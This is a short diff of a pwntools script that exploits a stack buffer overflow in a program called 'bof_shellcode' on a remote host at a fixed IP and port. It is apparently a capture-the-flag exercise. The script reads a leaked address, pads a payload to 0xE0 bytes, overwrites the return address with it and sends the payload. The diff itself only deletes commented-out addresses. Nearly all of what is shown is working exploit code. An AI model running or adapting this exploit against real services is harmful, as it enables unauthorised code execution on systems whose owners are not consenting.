@@ -7,9 +7,6 @@ context.log_level='debug'
 # p = process('./bof_shellcode')
 p = remote('141.164.48.98', '30003')
 
-# address = 0x7fffffffe300
-# address = 0x7fffd2505d30 
-
 p.recvuntil(':')
 given = p.recvline()
 # print(given[1:-1])
@@ -23,8 +20,6 @@ payload += b'B' * (0xE0 - len(payload))
 
 payload += address.to_bytes(8, 'little')
 payload += address.to_bytes(8, 'little')
-# payload += 0x7ffd15bd7db0.to_bytes(8, 'little')
-# payload += 0x7ffd15bd7db0.to_bytes(8, 'little')
 
 # pause()
 p.sendline(payload)
